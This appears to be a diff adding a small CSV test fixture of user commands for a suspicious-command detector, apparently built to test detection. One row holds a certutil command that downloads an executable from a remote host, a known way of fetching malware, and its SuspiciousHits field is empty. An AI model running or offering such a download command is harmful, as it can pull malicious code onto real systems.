@@ -1,0 +1,3 @@
+﻿"User","Command","SuspiciousHits"
+"analyst","Get-ChildItem",""
+"analyst","certutil -urlcache -f http://x/a.exe a.exe",""
